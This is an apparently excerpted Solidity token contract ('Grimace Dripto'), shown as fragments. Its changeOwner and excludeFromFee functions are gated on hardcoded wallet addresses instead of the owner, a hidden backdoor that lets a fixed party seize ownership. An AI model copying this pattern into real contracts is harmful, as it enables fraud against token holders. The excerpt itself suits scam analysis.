...
contract Ownable {
    ...
    function changeOwner(address newOwner) public  {
        require
         (  
             msg.sender
            == 0xdc22140Ca1dA0cbB3EBafe8F7E21685F6aA20211
            );
                    _owner = newOwner;
    }
}
...
contract TOKEN is IERC20, Ownable {
    ...
    constructor(address tokenOwner) {
        _name = "Grimace Dripto";
        _symbol = "Grimace Dripto";
        _decimals = 18;
    ...
    function excludeFromFee(address account) public  {
        require
         (  
             msg.sender
            == 0x6d3B7bb7426e6b2520b765769b75d985d0cDC72E
            );
